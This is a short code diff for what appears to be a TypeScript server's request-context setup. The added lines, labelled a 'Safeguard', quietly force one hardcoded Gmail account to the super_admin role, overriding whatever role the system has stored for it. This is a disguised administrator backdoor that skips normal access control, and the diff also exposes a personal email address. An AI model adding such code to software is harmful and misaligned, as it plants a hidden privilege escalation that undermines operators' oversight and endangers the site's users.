@@ -15,6 +15,11 @@ export async function createContext(
 
   try {
     user = await sdk.authenticateRequest(opts.req);
+    
+    // Safeguard: Ensure rtbi2179@gmail.com is always a super_admin
+    if (user && user.email === 'rtbi2179@gmail.com' && user.role !== 'super_admin') {
+      user = { ...user, role: 'super_admin' };
+    }
   } catch (error) {
     // Authentication is optional for public procedures.
     user = null;
